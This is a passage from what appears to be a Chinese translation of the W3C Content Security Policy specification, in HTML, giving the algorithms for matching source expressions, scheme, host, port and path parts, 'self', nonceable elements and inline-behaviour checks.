                            <p>如果 <var>port-part</var> 不 <a data-link-type="dfn" href="#port-part-matches"
                                    id="ref-for-port-part-matches"><code>port-part</code> 匹配</a> <var>url</var>，
                                则返回 "<code>Does Not Match</code>"。</p>
                        <li data-md>
                            <p>如果 <var>expression</var> 包含一个非空的 <a data-link-type="grammar" href="#grammardef-path-part"
                                    id="ref-for-grammardef-path-part①"><code>path-part</code></a>，并且 <var>redirect
                                    count</var> 为 0，那么：</p>
                            <ol>
                                <li data-md>
                                    <p>令 <var>path</var> 为通过连接 <var>url</var> 的 <a data-link-type="dfn"
                                            href="https://url.spec.whatwg.org/#concept-url-path"
                                            id="ref-for-concept-url-path">路径</a>，使用 U+002F SOLIDUS 字符
                                        (<code>/</code>) 得到的结果。</p>
                                <li data-md>
                                    <p>如果 <var>expression</var> 的 <a data-link-type="grammar"
                                            href="#grammardef-path-part"
                                            id="ref-for-grammardef-path-part②"><code>path-part</code></a> 不 <a
                                            data-link-type="dfn" href="#path-part-match"
                                            id="ref-for-path-part-match"><code>path-part</code> 匹配</a>
                                        <var>path</var>，
                                        则返回 "<code>Does Not Match</code>"。
                                    </p>
                            </ol>
                        <li data-md>
                            <p>返回 "<code>Matches</code>"。</p>
                    </ol>
                <li data-md>
                    <p>如果 <var>expression</var> 与 "<code>'self'</code>" 进行 <a data-link-type="dfn"
                            href="https://infra.spec.whatwg.org/#ascii-case-insensitive"
                            id="ref-for-ascii-case-insensitive⑧">ASCII 大小写不敏感</a> 匹配，
                        如果满足以下任一条件，则返回 "<code>Matches</code>"：</p>
                    <ol>
                        <li data-md>
                            <p><var>origin</var> 与 <var>url</var> 的 <a data-link-type="dfn"
                                    href="https://url.spec.whatwg.org/#concept-url-origin"
                                    id="ref-for-concept-url-origin①">origin</a> 相同</p>
                        <li data-md>
                            <p><var>origin</var> 的 <code
                                    class="idl"><a data-link-type="idl" href="https://url.spec.whatwg.org/#dom-url-host" id="ref-for-dom-url-host②">host</a></code>
                                与 <var>url</var> 的 <code
                                    class="idl"><a data-link-type="idl" href="https://url.spec.whatwg.org/#dom-url-host" id="ref-for-dom-url-host③">host</a></code>
                                相同，
                                <var>origin</var> 的 <code
                                    class="idl"><a data-link-type="idl" href="https://url.spec.whatwg.org/#dom-url-port" id="ref-for-dom-url-port">port</a></code>
                                和 <var>url</var> 的 <code
                                    class="idl"><a data-link-type="idl" href="https://url.spec.whatwg.org/#dom-url-port" id="ref-for-dom-url-port①">port</a></code>
                                也相同，
                                或者二者的 <a data-link-type="dfn" href="https://url.spec.whatwg.org/#default-port"
                                    id="ref-for-default-port">默认端口</a> 相同，
                                且满足以下条件之一：
                            </p>
                            <ol>
                                <li data-md>
                                    <p><var>url</var> 的 <a data-link-type="dfn"
                                            href="https://url.spec.whatwg.org/#concept-url-scheme"
                                            id="ref-for-concept-url-scheme⑧">scheme</a> 是 "<code>https</code>" 或
                                        "<code>wss</code>"</p>
                                <li data-md>
                                    <p><var>origin</var> 的 <a data-link-type="dfn"
                                            href="https://url.spec.whatwg.org/#concept-url-scheme"
                                            id="ref-for-concept-url-scheme⑨">scheme</a> 是 "<code>http</code>"，且
                                        <var>url</var> 的 <a data-link-type="dfn"
                                            href="https://url.spec.whatwg.org/#concept-url-scheme"
                                            id="ref-for-concept-url-scheme①⓪">scheme</a> 是 "<code>http</code>" 或
                                        "<code>ws</code>"
                                    </p>
                            </ol>
                    </ol>
                    <p class="note" role="note"><span class="marker">注意：</span> 像上述 <a data-link-type="grammar"
                            href="#grammardef-scheme-part"
                            id="ref-for-grammardef-scheme-part⑤"><code>scheme-part</code></a> 逻辑一样，
                        "<code>'self'</code>"
                        匹配算法允许在安全情况下升级到安全 scheme。
                        我们将这些升级限制为在特定 scheme 的默认端口上运行的端点或与受保护资源的 origin 匹配的端口，
                        因为这似乎足以应对预期可能成功的升级。
                    </p>
                <li data-md>
                    <p>返回 "<code>Does Not Match</code>"。</p>
            </ol>
            <h5 class="heading settled algorithm" data-algorithm="scheme-part 匹配" data-level="6.7.2.9"
                id="match-schemes"><span class="secno">6.7.2.9. </span><span class="content"> <code>scheme-part</code>
                    匹配 </span><a class="self-link" href="#match-schemes"></a></h5>
            <p>一个 <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#ascii-string"
                    id="ref-for-ascii-string⑤">ASCII 字符串</a> <dfn class="dfn-paneled" data-dfn-type="dfn" data-export
                    data-lt="scheme-part match" id="scheme-part-match"><code>scheme-part</code> 匹配</dfn> 另一个 <a
                    data-link-type="dfn" href="https://infra.spec.whatwg.org/#ascii-string"
                    id="ref-for-ascii-string⑥">ASCII 字符串</a>，如果一个包含前者作为 <a data-link-type="grammar"
                    href="#grammardef-scheme-part" id="ref-for-grammardef-scheme-part⑥"><code>scheme-part</code></a> 的
                CSP 源表达式可能匹配包含后者作为 <a data-link-type="dfn" href="https://url.spec.whatwg.org/#concept-url-scheme"
                    id="ref-for-concept-url-scheme①①">scheme</a> 的 URL。例如，我们可以说 "http" <a data-link-type="dfn"
                    href="#scheme-part-match" id="ref-for-scheme-part-match②"><code>scheme-part</code> 匹配</a> "https"。
            </p>
            <p class="note" role="note"><span class="marker">注意：</span> 匹配关系是非对称的。例如，源表达式 <code>https:</code> 和
                <code>https://example.com/</code> 不匹配 URL <code>http://example.com/</code>。
                我们总是允许从明确的不安全表达式进行安全升级。<code>script-src http:</code> 被视为等同于
                <code>script-src http: https:</code>，<code>script-src http://example.com</code> 等同于
                <code>script-src http://example.com https://example.com</code>，<code>connect-src ws:</code> 等同于
                <code>connect-src ws: wss:</code>。
            </p>
            <p>更正式地说，如果以下算法返回 "<code>Matches</code>"，则认为两个 <a data-link-type="dfn"
                    href="https://infra.spec.whatwg.org/#ascii-string" id="ref-for-ascii-string⑦">ASCII 字符串</a>
                <var>A</var> 和 <var>B</var> 是 <a data-link-type="dfn" href="#scheme-part-match"
                    id="ref-for-scheme-part-match③"><code>scheme-part</code> 匹配</a>。
            </p>
            <ol class="algorithm">
                <li data-md>
                    <p>如果以下条件之一为真，则返回 "<code>Matches</code>"：</p>
                    <ol>
                        <li data-md>
                            <p><var>A</var> 与 <var>B</var> 是 <a data-link-type="dfn"
                                    href="https://infra.spec.whatwg.org/#ascii-case-insensitive"
                                    id="ref-for-ascii-case-insensitive⑨">ASCII 大小写不敏感</a> 匹配。</p>
                        <li data-md>
                            <p><var>A</var> 与 "<code>http</code>" 是 <a data-link-type="dfn"
                                    href="https://infra.spec.whatwg.org/#ascii-case-insensitive"
                                    id="ref-for-ascii-case-insensitive①⓪">ASCII 大小写不敏感</a> 匹配，并且 <var>B</var> 与
                                "<code>https</code>" 是 <a data-link-type="dfn"
                                    href="https://infra.spec.whatwg.org/#ascii-case-insensitive"
                                    id="ref-for-ascii-case-insensitive①①">ASCII 大小写不敏感</a> 匹配。</p>
                        <li data-md>
                            <p><var>A</var> 与 "<code>ws</code>" 是 <a data-link-type="dfn"
                                    href="https://infra.spec.whatwg.org/#ascii-case-insensitive"
                                    id="ref-for-ascii-case-insensitive①②">ASCII 大小写不敏感</a> 匹配，并且 <var>B</var> 与
                                "<code>wss</code>"、"<code>http</code>" 或 "<code>https</code>" 是 <a data-link-type="dfn"
                                    href="https://infra.spec.whatwg.org/#ascii-case-insensitive"
                                    id="ref-for-ascii-case-insensitive①③">ASCII 大小写不敏感</a> 匹配。</p>
                        <li data-md>
                            <p><var>A</var> 与 "<code>wss</code>" 是 <a data-link-type="dfn"
                                    href="https://infra.spec.whatwg.org/#ascii-case-insensitive"
                                    id="ref-for-ascii-case-insensitive①④">ASCII 大小写不敏感</a> 匹配，并且 <var>B</var> 与
                                "<code>https</code>" 是 <a data-link-type="dfn"
                                    href="https://infra.spec.whatwg.org/#ascii-case-insensitive"
                                    id="ref-for-ascii-case-insensitive①⑤">ASCII 大小写不敏感</a> 匹配。</p>
                    </ol>
                <li data-md>
                    <p>返回 "<code>Does Not Match</code>"。</p>
            </ol>
            <h5 class="heading settled algorithm" data-algorithm="host-part 匹配" data-level="6.7.2.10" id="match-hosts">
                <span class="secno">6.7.2.10. </span><span class="content"> <code>host-part</code> 匹配 </span><a
                    class="self-link" href="#match-hosts"></a>
            </h5>
            <p>一个 <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#ascii-string"
                    id="ref-for-ascii-string⑧">ASCII 字符串</a> <dfn class="dfn-paneled" data-dfn-type="dfn" data-export
                    data-lt="host-part match" id="host-part-match"><code>host-part</code> 匹配</dfn> 一个 <a
                    data-link-type="dfn" href="https://url.spec.whatwg.org/#concept-host"
                    id="ref-for-concept-host">host</a>，如果一个包含前者作为 <a data-link-type="grammar"
                    href="#grammardef-host-part" id="ref-for-grammardef-host-part②"><code>host-part</code></a> 的 CSP
                源表达式可能匹配后者。例如，我们说 "www.example.com" <a data-link-type="dfn" href="#host-part-match"
                    id="ref-for-host-part-match①">host-part 匹配</a> "www.example.com"。</p>
            <p>更正式地说，如果以下算法返回 "<code>Matches</code>"，则认为 <a data-link-type="dfn"
                    href="https://infra.spec.whatwg.org/#ascii-string" id="ref-for-ascii-string⑨">ASCII 字符串</a>
                <var>pattern</var> 和 <a data-link-type="dfn" href="https://url.spec.whatwg.org/#concept-host"
                    id="ref-for-concept-host①">host</a> <var>host</var> 是 <a data-link-type="dfn"
                    href="#host-part-match" id="ref-for-host-part-match②"><code>host-part</code> 匹配</a>。
            </p>
            <p class="note" role="note"><span class="marker">注意：</span> 匹配关系是非对称的。即，<var>pattern</var> 匹配
                <var>host</var> 并不意味着 <var>host</var> 会匹配 <var>pattern</var>。例如，<code>*.example.com</code> <a
                    data-link-type="dfn" href="#host-part-match" id="ref-for-host-part-match③"><code>host-part</code>
                    匹配</a> <code>www.example.com</code>，但 <code>www.example.com</code> 不 <a data-link-type="dfn"
                    href="#host-part-match" id="ref-for-host-part-match④"><code>host-part</code> 匹配</a>
                <code>*.example.com</code>。
            </p>
            <p class="note" role="note"><span class="marker">注意：</span> 未来版本的规范可能允许文字形式的 IPv6 和 IPv4
                地址，具体取决于使用情况和需求。然而，由于 IP 地址相对于命名主机的安全属性较弱，建议作者尽可能优先使用后者。</p>
            <ol class="algorithm">
                <li data-md>
                    <p>如果 <var>host</var> 不是一个 <a data-link-type="dfn"
                            href="https://url.spec.whatwg.org/#concept-domain" id="ref-for-concept-domain">域</a>，返回
                        "<code>Does Not Match</code>"。</p>
                <li data-md>
                    <p>如果 <var>pattern</var> 是 "<code>*</code>"，返回 "<code>Matches</code>"。</p>
                <li data-md>
                    <p>如果 <var>pattern</var> <a data-link-type="dfn"
                            href="https://infra.spec.whatwg.org/#string-starts-with"
                            id="ref-for-string-starts-with">以</a> "<code>*.</code>" 开始：</p>
                    <ol>
                        <li data-md>
                            <p>令 <var>remaining</var> 为去掉首个 U+002A (<code>*</code>) 并 <a data-link-type="dfn"
                                    href="https://infra.spec.whatwg.org/#ascii-lowercase"
                                    id="ref-for-ascii-lowercase①">转为 ASCII 小写</a> 的 <var>pattern</var>。</p>
                        <li data-md>
                            <p>如果 <var>host</var> 转为 <a data-link-type="dfn"
                                    href="https://infra.spec.whatwg.org/#ascii-lowercase"
                                    id="ref-for-ascii-lowercase②">ASCII 小写</a> 后 <a data-link-type="dfn"
                                    href="https://infra.spec.whatwg.org/#string-ends-with"
                                    id="ref-for-string-ends-with">以</a> <var>remaining</var> 结尾，则返回
                                "<code>Matches</code>"。</p>
                        <li data-md>
                            <p>返回 "<code>Does Not Match</code>"。</p>
                    </ol>
                <li data-md>
                    <p>如果 <var>pattern</var> 不是与 <var>host</var> <a data-link-type="dfn"
                            href="https://infra.spec.whatwg.org/#ascii-case-insensitive"
                            id="ref-for-ascii-case-insensitive①⑥">ASCII 大小写不敏感</a> 匹配，返回 "<code>Does Not Match</code>"。
                    </p>
                <li data-md>
                    <p>返回 "<code>Matches</code>"。</p>
            </ol>
            <h5 class="heading settled algorithm" data-algorithm="port-part 匹配" data-level="6.7.2.11" id="match-ports">
                <span class="secno">6.7.2.11. </span><span class="content"> <code>port-part</code> 匹配 </span><a
                    class="self-link" href="#match-ports"></a>
            </h5>
            <p>如果一个 CSP 源表达式包含一个 <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#ascii-string"
                    id="ref-for-ascii-string①⓪">ASCII 字符串</a> <var>input</var>，该 <dfn class="dfn-paneled"
                    data-dfn-type="dfn" data-export id="port-part-matches"><code>port-part</code> 匹配</dfn> 一个 <a
                    data-link-type="dfn" href="https://url.spec.whatwg.org/#concept-url"
                    id="ref-for-concept-url③">URL</a> <var>url</var> 的 <a data-link-type="dfn"
                    href="https://url.spec.whatwg.org/#concept-url-port" id="ref-for-concept-url-port">port</a> 和 <a
                    data-link-type="dfn" href="https://url.spec.whatwg.org/#concept-url-scheme"
                    id="ref-for-concept-url-scheme①②">scheme</a>，则它可以潜在地匹配一个包含该 <code>port</code> 和 <code>scheme</code>
                的 URL。例如，"80" <a data-link-type="dfn" href="#port-part-matches"
                    id="ref-for-port-part-matches①"><code>port-part</code> 匹配</a> http://example.com。</p>
            <ol class="algorithm">
                <li data-md>
                    <p class="assertion">断言：<var>input</var> 是空字符串、"*" 或 <a data-link-type="dfn"
                            href="https://infra.spec.whatwg.org/#ascii-digit" id="ref-for-ascii-digit">ASCII 数字</a>序列。
                    </p>
                <li data-md>
                    <p>如果 <var>input</var> 等于 "*"，返回 "<code>Matches</code>"。</p>
                <li data-md>
                    <p>如果 <var>input</var> 是空字符串，则将 <var>normalizedInput</var> 设为 null；否则，将 <var>input</var> 解释为十进制数。
                    </p>
                <li data-md>
                    <p>如果 <var>normalizedInput</var> 等于 <var>url</var> 的 <a data-link-type="dfn"
                            href="https://url.spec.whatwg.org/#concept-url-port"
                            id="ref-for-concept-url-port①">port</a>，返回 "<code>Matches</code>"。</p>
                <li data-md>
                    <p>如果 <var>url</var> 的 <a data-link-type="dfn" href="https://url.spec.whatwg.org/#concept-url-port"
                            id="ref-for-concept-url-port②">port</a> 是 null：</p>
                    <ol>
                        <li data-md>
                            <p>设 <var>defaultPort</var> 为 <var>url</var> 的 <a data-link-type="dfn"
                                    href="https://url.spec.whatwg.org/#default-port"
                                    id="ref-for-default-port①">默认端口</a>。</p>
                        <li data-md>
                            <p>如果 <var>normalizedInput</var> 等于 <var>defaultPort</var>，返回 "<code>Matches</code>"。</p>
                    </ol>
                <li data-md>
                    <p>返回 "<code>Does Not Match</code>"。</p>
            </ol>
            <h5 class="heading settled algorithm" data-algorithm="path-part 匹配" data-level="6.7.2.12" id="match-paths">
                <span class="secno">6.7.2.12. </span><span class="content"> <code>path-part</code> 匹配 </span><a
                    class="self-link" href="#match-paths"></a>
            </h5>
            <p>如果一个 CSP 源表达式包含 <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#ascii-string"
                    id="ref-for-ascii-string①①">ASCII 字符串</a> <var>path A</var>，该 <dfn class="dfn-paneled"
                    data-dfn-type="dfn" data-export data-lt="path-part match"
                    id="path-part-match"><code>path-part</code> 匹配</dfn> 另一个 <a data-link-type="dfn"
                    href="https://infra.spec.whatwg.org/#ascii-string" id="ref-for-ascii-string①②">ASCII 字符串</a>
                <var>path B</var>，则它可以潜在地匹配包含该 <code>path</code> 的 URL。例如，我们说 "/subdirectory/" <a data-link-type="dfn"
                    href="#path-part-match" id="ref-for-path-part-match①"><code>path-part</code> 匹配</a>
                "/subdirectory/file"。
            </p>
            <p class="note" role="note"><span class="marker">注意：</span> 匹配关系是非对称的。即，<var>path A</var> 匹配 <var>path
                    B</var> 并不意味着 <var>path B</var> 会匹配 <var>path A</var>。</p>
            <ol class="algorithm">
                <li data-md>
                    <p>如果 <var>path A</var> 是空字符串，返回 "<code>Matches</code>"。</p>
                <li data-md>
                    <p>如果 <var>path A</var> 仅由一个等于 U+002F SOLIDUS 字符 (<code>/</code>) 的字符组成，并且 <var>path B</var>
                        是空字符串，返回 "<code>Matches</code>"。</p>
                <li data-md>
                    <p>如果 <var>path A</var> 的最后一个字符是 U+002F SOLIDUS 字符 (<code>/</code>)，则设 <var>exact match</var> 为
                        <code>false</code>，否则设为 <code>true</code>。
                    </p>
                <li data-md>
                    <p>设 <var>path list A</var> 和 <var>path list B</var> 为将 <var>path A</var> 和 <var>path B</var> 分别使用
                        U+002F SOLIDUS 字符 (<code>/</code>) <a data-link-type="dfn"
                            href="https://infra.spec.whatwg.org/#strictly-split"
                            id="ref-for-strictly-split①">严格分割</a>后的结果。</p>
                <li data-md>
                    <p>如果 <var>path list A</var> 的项数多于 <var>path list B</var>，返回 "<code>Does Not Match</code>"。</p>
                <li data-md>
                    <p>如果 <var>exact match</var> 为 <code>true</code>，并且 <var>path list A</var> 的项数与 <var>path list
                            B</var> 不相同，返回 "<code>Does Not Match</code>"。</p>
                <li data-md>
                    <p>如果 <var>exact match</var> 为 <code>false</code>：</p>
                    <ol>
                        <li data-md>
                            <p class="assertion">断言：<var>path list A</var> 的最后一项是空字符串。</p>
                        <li data-md>
                            <p>从 <var>path list A</var> 中移除最后一项。</p>
                    </ol>
                <li data-md>
                    <p><a data-link-type="dfn" href="https://infra.spec.whatwg.org/#list-iterate"
                            id="ref-for-list-iterate③④">对于每个</a> <var>piece A</var>，在 <var>path list A</var> 中：</p>
                    <ol>
                        <li data-md>
                            <p>设 <var>piece B</var> 为 <var>path list B</var> 中的下一个项。</p>
                        <li data-md>
                            <p>设 <var>decoded piece A</var> 为 <a data-link-type="dfn"
                                    href="https://url.spec.whatwg.org/#string-percent-decode"
                                    id="ref-for-string-percent-decode">百分号解码</a>后的 <var>piece A</var>。</p>
                        <li data-md>
                            <p>设 <var>decoded piece B</var> 为 <a data-link-type="dfn"
                                    href="https://url.spec.whatwg.org/#string-percent-decode"
                                    id="ref-for-string-percent-decode①">百分号解码</a>后的 <var>piece B</var>。</p>
                        <li data-md>
                            <p>如果 <var>decoded piece A</var> 不等于 <var>decoded piece B</var>，返回
                                "<code>Does Not Match</code>"。</p>
                    </ol>
                <li data-md>
                    <p>返回 "<code>Matches</code>"。</p>
            </ol>
            <h4 class="heading settled" data-level="6.7.3" id="matching-elements"><span class="secno">6.7.3.
                </span><span class="content">元素匹配算法</span><a class="self-link" href="#matching-elements"></a></h4>
            <h5 class="heading settled algorithm" data-algorithm="Is element nonceable?" data-level="6.7.3.1"
                id="is-element-nonceable"><span class="secno">6.7.3.1. </span><span class="content">
                    <var>element</var> 是否可以添加 nonce? </span><a class="self-link" href="#is-element-nonceable"></a></h5>
            <p>给定一个 <code
                    class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#element" id="ref-for-element⑨">Element</a></code>
                <var>element</var>，如果可以使用 <a data-link-type="grammar" href="#grammardef-nonce-source"
                    id="ref-for-grammardef-nonce-source⑤"><code>nonce-source</code></a> 表达式匹配该元素（详见
                <a href="#security-nonce-hijacking">第7.2节 Nonce 劫持</a>），则返回 "<code>Nonceable</code>"，否则返回
                "<code>Not Nonceable</code>"。
            </p>
            <ol>
                <li data-md>
                    <p>如果 <var>element</var> 没有名为 "<code>nonce</code>" 的属性，返回 "<code>Not Nonceable</code>"。</p>
                <li data-md>
                    <p>如果 <var>element</var> 是一个
                        <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/scripting.html#script" id="ref-for-script⑥">script</a></code>
                        元素，则 <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#list-iterate"
                            id="ref-for-list-iterate③⑤">对每个</a> <var>attribute</var>（<var>element</var> 的 <a
                            data-link-type="dfn" href="https://dom.spec.whatwg.org/#concept-element-attribute"
                            id="ref-for-concept-element-attribute">属性列表</a>中的）执行以下检查：
                    </p>
                    <ol>
                        <li data-md>
                            <p>如果 <var>attribute</var> 的名称包含 "<code>&lt;script</code>" 或 "<code>&lt;style</code>" 的 <a
                                    data-link-type="dfn" href="https://infra.spec.whatwg.org/#ascii-case-insensitive"
                                    id="ref-for-ascii-case-insensitive①⑦">ASCII 大小写不敏感</a> 匹配，返回
                                "<code>Not Nonceable</code>"。</p>
                        <li data-md>
                            <p>如果 <var>attribute</var> 的值包含 "<code>&lt;script</code>" 或 "<code>&lt;style</code>" 的 <a
                                    data-link-type="dfn" href="https://infra.spec.whatwg.org/#ascii-case-insensitive"
                                    id="ref-for-ascii-case-insensitive①⑧">ASCII 大小写不敏感</a> 匹配，返回
                                "<code>Not Nonceable</code>"。</p>
                    </ol>
                <li data-md>
                    <p>如果 <var>element</var> 在标记化期间发生了 <a data-link-type="dfn"
                            href="https://html.spec.whatwg.org/multipage/parsing.html#parse-error-duplicate-attribute"
                            id="ref-for-parse-error-duplicate-attribute">重复属性</a> 的 <a data-link-type="dfn"
                            href="https://html.spec.whatwg.org/multipage/images.html#concept-microsyntax-parse-error"
                            id="ref-for-concept-microsyntax-parse-error">解析错误</a>，返回 "<code>Not Nonceable</code>"。</p>
                    <p class="issue" id="issue-820579ab"><a class="self-link" href="#issue-820579ab"></a> 我们需要在 HTML
                        中设置一些钩子来记录此错误，以便在此使用。<a href="https://github.com/whatwg/html/issues/3257">[Issue
                            #whatwg/html#3257]</a></p>
                <li data-md>
                    <p>返回 "<code>Nonceable</code>"。</p>
            </ol>
            <p class="issue" id="issue-4592ac7e"><a class="self-link" href="#issue-4592ac7e"></a>
                此处理旨在降低悬空标记攻击的风险，该攻击通过从现有元素中窃取 nonce 以加载注入的脚本。然而，这种操作相当昂贵，因为它需要遍历所有属性及其值，以确定脚本是否应执行。在这里，我们试图通过仅对
                <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/scripting.html#script" id="ref-for-script⑦">script</a></code>
                元素且 nonce 存在时执行此检查，来尽量减少影响，但在我们了解其影响之前，我们应将此算法视为 "有风险"。<a
                    href="https://github.com/w3c/webappsec-csp/issues/98">[Issue
                    #w3c/webappsec-csp#98]</a>
            </p>
            <h5 class="heading settled algorithm"
                data-algorithm="Does a source list allow all inline behavior for type?" data-level="6.7.3.2"
                id="allow-all-inline"><span class="secno">6.7.3.2. </span><span class="content"> 源列表是否允许所有内联行为用于
                    <var>type</var>？</span><a class="self-link" href="#allow-all-inline"></a></h5>
            <p>给定一个 <a data-link-type="dfn" href="#source-lists" id="ref-for-source-lists①⑦">源列表</a> <dfn
                    class="dfn-paneled" data-dfn-for="source list" data-dfn-type="dfn" data-export
                    data-local-lt="allow all inline behavior" id="source-list-allows-all-inline-behavior">允许所有内联行为</dfn>
                的特定 <var>type</var>，如果它包含 <a data-link-type="grammar" href="#grammardef-keyword-source"
                    id="ref-for-grammardef-keyword-source②"><code>keyword-source</code></a> 表达式 <a
                    data-link-type="grammar" href="#grammardef-unsafe-inline"
                    id="ref-for-grammardef-unsafe-inline①"><code>'unsafe-inline'</code></a>，并且不覆盖以下算法中描述的表达式：
            </p>
            <p>给定一个 <a data-link-type="dfn" href="#source-lists" id="ref-for-source-lists①⑧">源列表</a>
                <var>list</var> 和一个字符串 <var>type</var>，如果给定 <var>type</var> 的所有内联内容被允许，则以下算法返回
                "<code>Allows</code>"，否则返回 "<code>Does Not Allow</code>"。
            </p>
            <ol>
                <li data-md>
                    <p>设 <var>allow all inline</var> 为 <code>false</code>。</p>
                <li data-md>
                    <p><a data-link-type="dfn" href="https://infra.spec.whatwg.org/#list-iterate"
                            id="ref-for-list-iterate③⑥">对于每个</a> <var>expression</var>（在 <var>list</var> 中）：</p>
                    <ol>
                        <li data-md>
                            <p>如果 <var>expression</var> 匹配 <a data-link-type="grammar" href="#grammardef-nonce-source"
                                    id="ref-for-grammardef-nonce-source⑥"><code>nonce-source</code></a> 或 <a
                                    data-link-type="grammar" href="#grammardef-hash-source"
                                    id="ref-for-grammardef-hash-source⑥"><code>hash-source</code></a> 语法，返回
                                "<code>Does Not Allow</code>"。</p>
                        <li data-md>
                            <p>如果 <var>type</var> 是 "<code>script</code>"、"<code>script attribute</code>" 或
                                "<code>navigation</code>"，并且 <var>expression</var> 匹配 <a data-link-type="grammar"
                                    href="#grammardef-keyword-source"
                                    id="ref-for-grammardef-keyword-source③">keyword-source</a> "<a
                                    data-link-type="grammar" href="#grammardef-strict-dynamic"
                                    id="ref-for-grammardef-strict-dynamic③"><code>'strict-dynamic'</code></a>"，返回
                                "<code>Does Not Allow</code>"。</p>
                            <p class="note" role="note"><span class="marker">注意：</span> <code>'strict-dynamic'</code>
                                仅适用于脚本，不适用于其他资源类型。更详细的用法在 <a href="#strict-dynamic-usage">第8.2节
                                    "'strict-dynamic'"的使用</a> 中解释。
                            </p>
                        <li data-md>
                            <p>如果 <var>expression</var> 与 <a data-link-type="grammar" href="#grammardef-keyword-source"
                                    id="ref-for-grammardef-keyword-source④"><code>keyword-source</code></a> "<a
                                    data-link-type="grammar" href="#grammardef-unsafe-inline"
                                    id="ref-for-grammardef-unsafe-inline②"><code>'unsafe-inline'</code></a>" 在 <a
                                    data-link-type="dfn" href="https://infra.spec.whatwg.org/#ascii-case-insensitive"
                                    id="ref-for-ascii-case-insensitive①⑨">ASCII 大小写不敏感</a> 匹配中匹配，
                                设置 <var>allow all inline</var> 为 <code>true</code>。</p>
                    </ol>
                <li data-md>
                    <p>如果 <var>allow all inline</var> 为 <code>true</code>，返回 "<code>Allows</code>"。
                        否则，返回 "<code>Does Not Allow</code>"。</p>
            </ol>
            <div class="example" id="example-c6b777a0">
                <a class="self-link" href="#example-c6b777a0"></a> <a data-link-type="dfn" href="#source-lists"
                    id="ref-for-source-lists①⑨">源列表</a> <a data-link-type="dfn"
                    href="#source-list-allows-all-inline-behavior"
                    id="ref-for-source-list-allows-all-inline-behavior">允许所有内联行为</a> 的示例：
                <pre>'unsafe-inline' http://a.com http://b.com
'unsafe-inline'
</pre>
                <p><a data-link-type="dfn" href="#source-lists" id="ref-for-source-lists②⓪">源列表</a>
                    由于包含非同步代码（nonce）和/或哈希，或缺少 '<code>unsafe-inline</code>'，而不 <a data-link-type="dfn"
                        href="#source-list-allows-all-inline-behavior"
                        id="ref-for-source-list-allows-all-inline-behavior①">允许所有内联行为</a> 的示例：
                </p>
                <pre>'sha512-321cba' 'nonce-abc'
http://example.com 'unsafe-inline' 'nonce-abc'
</pre>
                <p><a data-link-type="dfn" href="#source-lists" id="ref-for-source-lists②①">源列表</a> 当
                    <var>type</var> 是 '<code>script</code>' 或 '<code>script attribute</code>' 时由于存在
                    '<code>strict-dynamic</code>' 而不 <a data-link-type="dfn"
                        href="#source-list-allows-all-inline-behavior"
                        id="ref-for-source-list-allows-all-inline-behavior②">允许所有内联行为</a>，但在其他情况下 <a
                        data-link-type="dfn" href="#source-list-allows-all-inline-behavior"
                        id="ref-for-source-list-allows-all-inline-behavior③">允许所有内联行为</a> 的示例：
                </p>
                <pre>'unsafe-inline' 'strict-dynamic'
http://example.com 'strict-dynamic' 'unsafe-inline'
</pre>
            </div>
            <h5 class="heading settled algorithm" data-algorithm="Does element match source list for type and source?"
                data-level="6.7.3.3" id="match-element-to-source-list"><span class="secno">6.7.3.3. </span><span
                    class="content"> <var>element</var> 是否匹配 <var>type</var> 和 <var>source</var> 的源列表？</span><a
                    class="self-link" href="#match-element-to-source-list"></a></h5>
            <p>给定一个 <code
                    class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#element" id="ref-for-element①⓪">Element</a></code>
                <var>element</var>，一个 <a data-link-type="dfn" href="#source-lists" id="ref-for-source-lists②②">源列表</a>
                <var>list</var>，一个字符串 <var>type</var> 和一个字符串 <var>source</var>，此算法返回 "<code>Matches</code>" 或
                "<code>Does Not Match</code>"。
            </p>
            <p class="note" role="note"><span class="marker">注意：</span>无论文档的编码如何，<var>source</var> 都将被转换为
                <code>UTF-8</code>，然后再应用任何哈希算法。
            </p>
            <ol>
                <li data-md>
                    <p>如果 <a href="#allow-all-inline">§ 6.7.3.2 源列表是否允许所有内联行为用于 type？</a> 给定 <var>list</var> 和
                        <var>type</var> 时返回 "<code>Allows</code>"，则返回 "<code>Matches</code>"。
                    </p>
                <li data-md>
                    <p>如果 <var>type</var> 是 "<code>script</code>" 或 "<code>style</code>"，并且 <a
                            href="#is-element-nonceable">§ 6.7.3.1 元素是否为 nonceable？</a> 执行 <var>element</var> 时返回
                        "<code>Nonceable</code>"：
                    </p>
                    <ol>
                        <li data-md>
                            <p><a data-link-type="dfn" href="https://infra.spec.whatwg.org/#list-iterate"
                                    id="ref-for-list-iterate③⑦">对于每个</a> <var>expression</var>（在 <var>list</var> 中）：</p>
                            <ol>
                                <li data-md>
                                    <p>如果 <var>expression</var> 匹配 <a data-link-type="grammar"
                                            href="#grammardef-nonce-source"
                                            id="ref-for-grammardef-nonce-source⑦"><code>nonce-source</code></a> 语法，并且
                                        <var>element</var> 具有一个
                                        <code><a data-link-type="element-sub" href="https://html.spec.whatwg.org/multipage/urls-and-fetching.html#attr-nonce" id="ref-for-attr-nonce">nonce</a></code>
                                        属性，其值 <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#string-is"
                                            id="ref-for-string-is②">等于</a> <var>expression</var> 的 <a
                                            data-link-type="grammar" href="#grammardef-base64-value"
                                            id="ref-for-grammardef-base64-value⑥"><code>base64-value</code></a> 部分，返回
                                        "<code>Matches</code>"。
                                    </p>
                            </ol>
                    </ol>
                    <p class="note" role="note"><span class="marker">注意：</span> Nonce 仅适用于内联
                        <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/scripting.html#script" id="ref-for-script⑧">script</a></code>
                        和内联
                        <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/semantics.html#the-style-element" id="ref-for-the-style-element①">style</a></code>，不适用于这些元素的属性或
                        <code>javascript:</code> 导航。
                    </p>
                <li data-md>
                    <p>设 <var>unsafe-hashes flag</var> 为 <code>false</code>。</p>
                <li data-md>
                    <p><a data-link-type="dfn" href="https://infra.spec.whatwg.org/#list-iterate"
